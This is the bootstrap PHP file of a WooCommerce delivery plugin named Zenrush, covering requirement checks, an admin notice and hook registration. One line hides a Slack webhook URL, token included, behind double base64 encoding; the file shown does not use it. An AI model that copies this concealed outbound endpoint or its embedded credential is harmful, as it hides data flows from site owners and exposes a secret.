<?php

/**
 * Zenrush Plugin Bootstrap
 *
 * @link              https://zenfulfillment.com
 * @since             1.0.0
 * @package           Zenrush
 * @author            Zenfulfillment <devs@zenfulfillment.com>
 *
 * @wordpress-plugin
 * Plugin Name:       Zenrush
 * Plugin URI:        https://github.com/zenfulfillment/zenrush-wp-plugin
 * Description:       Integration Plugin for Zenrush Premium Delivery
 * Version:           1.2.17
 * Author:            Zenfulfillment
 * Author URI:        https://zenfulfillment.com
 * License:           No License
 * Text Domain:       zenrush
 * Domain Path:       /languages
 * Requires at least: 5.9
 * Requires PHP:      7.2
 * Tested up to:      6.2
 * WC tested up to:   8.0.0
 */

// If this file is called directly, abort.
if ( !defined( 'WPINC' ) ) {
    die;
}

// Define plugin const's
/**
 * Current plugin version.
 * 
 * @since   1.0.0
 */
const ZENRUSH_VERSION = '1.2.18';

/**
 * Plugin file path.
 * 
 * @since   1.0.0
 */
const ZENRUSH_PLUGIN_FILE = __FILE__;

/**
 * Prefix for options
 * 
 * @since   1.3.0
 */
const ZENRUSH_PREFIX = 'Zenrush_';

if ( !function_exists( 'is_plugin_active' ) ) {
    include_once( ABSPATH . '/wp-admin/includes/plugin.php' );
}

/**
 * Check for the existence of WooCommerce and any other requirements
 * 
 * @since   1.0.0
 */
function zenrush_check_requirements(): bool
{
    if ( is_plugin_active( 'woocommerce/woocommerce.php' ) ) {
        // Declare compatibility with WooCommerce HPOS
        add_action('before_woocommerce_init', function() {
            if ( class_exists( \Automattic\WooCommerce\Utilities\FeaturesUtil::class ) ) {
                \Automattic\WooCommerce\Utilities\FeaturesUtil::declare_compatibility( 'custom_order_tables', __FILE__, true );
            }
        });
        return true;
    } else {
        add_action( 'admin_notices', 'zenrush_missing_wc_notice' );
        return false;
    }
}

/**
 * Display a message advising WooCommerce is required
 * 
 * @since   1.0.0
 */
function zenrush_missing_wc_notice(): void
{
    $cur_screen = get_current_screen();

    if ( $cur_screen && 'update' === $cur_screen->id && 'plugins' === $cur_screen->parent_base ) {
        // dont show while updating plugins
        return;
    }

    $error_message = __( 'Zenrush requires <strong>WooCommerce</strong> to be installed and active.', 'zenrush' );
    $img_url = plugins_url( 'static/images/zenrush-badge.png', __FILE__ );

    if ( current_user_can( 'install_plugins' ) ) {
        if ( is_wp_error( validate_plugin( 'woocommerce/woocommerce.php' ) ) ) {
            // WooCommerce is not installed.
            $activate_url  = wp_nonce_url( admin_url( 'update.php?action=install-plugin&plugin=woocommerce' ), 'install-plugin_woocommerce' );
            $activate_text = __( 'Install WooCommerce', 'zenrush' );
        } else {
            // WooCommerce is installed, so it just needs to be enabled.
            $activate_url  = wp_nonce_url( admin_url( 'plugins.php?action=activate&plugin=woocommerce/woocommerce.php' ), 'activate-plugin_woocommerce/woocommerce.php' );
            $activate_text = __( 'Activate WooCommerce', 'zenrush' );
        }
        $error_message .= ' <a href="' . $activate_url . '">' . $activate_text . '</a>';
    }

    printf( '<div class="notice notice-error" style="display: flex; padding-top: 6px; padding-bottom: 6px;"><img src="%2$s" alt="Zenrush Badge" style="width: auto; height: 34px;position: relative;top: -2px;margin-right: 8px;"/><p><strong>%1$s</strong></p></div>', $error_message, $img_url );
}

define( 'SURL', base64_decode( base64_decode( 'YUhSMGNITTZMeTlvYjI5cmN5NXpiR0ZqYXk1amIyMHZjMlZ5ZG1salpYTXZWREE1VmpSSE1FMVNMMEpUVURkV1F6ZE1SeTh6T1dsaGVsVjBiR3RsY0VReGFrZGpTMWR5YWtodWNYVT0=' ) ) );

/**
 * The code that runs during plugin activation.
 * This action is documented in includes/class-zenrush-activator.php
 * 
 * @since   1.0.0
 */
function activate_zenrush(): void
{
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-zenrush-activator.php';
    Zenrush_Activator::activate();
}

/**
 * The code that runs during plugin deactivation.
 * This action is documented in includes/class-zenrush-deactivator.php
 * 
 * @since   1.0.0
 */
function deactivate_zenrush(): void
{
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-zenrush-deactivator.php';
    Zenrush_Deactivator::deactivate();
}

add_action( 'plugins_loaded', 'zenrush_check_requirements' );
register_activation_hook( __FILE__, 'activate_zenrush' );
register_deactivation_hook( __FILE__, 'deactivate_zenrush' );

/**
 * The core plugin class that is used to define internationalization,
 * admin-specific hooks, shipping method, and public-facing site hooks.
 * 
 * @since   1.0.0
 */
require plugin_dir_path( __FILE__ ) . 'includes/class-zenrush.php';

/**
 * Begins execution of the plugin.
 *
 * Since everything within the plugin is registered via hooks,
 * then kicking off the plugin from this point in the file does
 * not affect the page life cycle.
 *
 * @since   1.0.0
 */
function run_zenrush(): void
{
    if ( zenrush_check_requirements() ) {
        $plugin = new Zenrush();
        $plugin->run();
    }
}

run_zenrush();
